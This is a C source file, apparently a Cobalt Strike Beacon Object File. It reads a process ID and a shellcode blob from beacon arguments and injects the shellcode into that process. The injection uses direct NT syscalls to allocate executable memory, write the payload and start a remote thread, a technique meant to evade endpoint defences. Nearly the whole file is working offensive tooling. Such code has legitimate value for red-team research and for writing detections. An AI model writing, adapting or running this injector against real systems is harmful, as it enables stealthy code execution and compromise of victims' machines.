
/**
  Copyright © 2019-2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include "beacon.h"
#include "Syscalls.h"

VOID InjectShellcode(DWORD pid, char* sc_ptr, SIZE_T sc_len) {
    SIZE_T            wr;
    HANDLE            processHandle = NULL, threadHandle = NULL;
    LPVOID            ds=NULL;
    NTSTATUS          nts;
    CLIENT_ID         cid = {0};
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    LARGE_INTEGER     li;
    
    // Opening process
    cid.UniqueProcess = pid;
    
    nts = NtOpenProcess(&processHandle, 
      PROCESS_ALL_ACCESS, &oa, &cid);
    
    if(nts >= 0) {
      sc_len++;
      // Allocating read-write (RWX) memory for shellcode (opsec 101)
      nts = NtAllocateVirtualMemory(
        processHandle, &ds, 0, &sc_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
      
      if(nts >= 0) {    
        // Copying shellcode to remote process
        nts = NtWriteVirtualMemory(processHandle, ds, sc_ptr, sc_len-1, &wr);
        
        if(nts >= 0) {

          // Executing thread in remote process
          nts = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, 
              (LPTHREAD_START_ROUTINE)ds, NULL, FALSE, 0, 0, 0, NULL);
            
          if(threadHandle != NULL) {
            // Waiting for thread to exit
            li.QuadPart = INFINITE;
            nts = NtWaitForSingleObject(threadHandle, FALSE, &li);
            
            // Close thread handle
            NtClose(threadHandle);
          } else BeaconPrintf(CALLBACK_ERROR,"Executing thread in remote process - FAILED! %08X\n", nts);
        }
        // Free remote memory
        NtFreeVirtualMemory(processHandle, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
      } else BeaconPrintf(CALLBACK_ERROR,"Copying shellcode to remote process - FAILED! %08X\n", nts);
      // Closing process handle
      NtClose(processHandle);

      BeaconPrintf(CALLBACK_OUTPUT, "Shellcode injection completed successfully!");

    } else {
    	BeaconPrintf(CALLBACK_ERROR,"Opening process - FAILED! %08X\n", nts);
    }
}

void go(char *args, int len) {
    
    char* sc_ptr;
    SIZE_T sc_len; 
    DWORD pid;
    datap parser;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    sc_len = BeaconDataLength(&parser);
    sc_ptr = BeaconDataExtract(&parser, NULL);
	
  	InjectShellcode(pid, sc_ptr, sc_len);
}
